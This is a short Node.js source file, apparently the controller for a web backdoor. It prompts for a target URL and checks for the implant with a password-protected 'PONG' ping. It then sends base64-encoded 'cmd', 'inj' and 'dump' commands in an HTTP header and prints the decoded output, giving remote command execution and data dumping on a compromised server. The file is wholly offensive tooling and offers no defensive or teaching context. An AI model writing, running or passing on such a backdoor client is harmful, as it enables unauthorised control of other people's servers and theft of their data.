const request = require('request');
const readline = require("readline");
const config = require('./config');

const req = (url, data) => new Promise((resolve, reject) => {
	let headers = {
		'X-Password': config.password,
	};
	headers[config.request_header] = data;
	//console.log(headers);
	request.get( { url, headers }, (error, response, body) => {
		if(!error){
			//console.log(response.headers);
			if(typeof response.headers[config.request_header.toLowerCase()] == 'undefined')
				resolve({ done: false, msg: 'Header not found!' });
			resolve({ done: true, msg: Buffer.from( response.headers[config.request_header.toLowerCase()].toString(), 'base64').toString('ascii') });
		}
		//console.log(response);
		resolve({ done: false, msg: error });
	});
});

const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout
});

const q = (url) => {
	rl.question('>', (command) => {
		
		command = command.trim();
		let sp = command.indexOf(' ');
		let com = '';
		let type = command;
		if(sp != -1){
			type = command.slice(0, sp);
			com = command.slice(sp + 1);
		}

		let prefix = false;
		switch (type) {
			case 'dump':
				prefix = 'd|';
				break;
			case 'cmd':
				prefix = 'c|';
				break;
			case 'inj':
				prefix = 'i|';
				break;
			case 'ping':
				prefix = 'p|';
				break;
		}
		if(prefix){
			req(url, prefix + Buffer.from(com).toString('base64')).then((result) => {
				if(result.done){
					console.log(result.msg)
				}else{
					console.log('#ERROR')
					console.error(result.msg)
				}
				q(url);
			});
		}else{
			console.log('valid command are: "cmd", "inj", "ping", "dump"');
			q(url);
		}
    });
};

rl.question("URL: ", (url) => {
	req(url, 'p|').then((result) => {
		if(result.done && result.msg == 'PONG'){
			console.log('Found Backdoor');
			q(url);
		}else{
			console.log('Backdoor not found');
			process.exit(-1);
		}
	});
});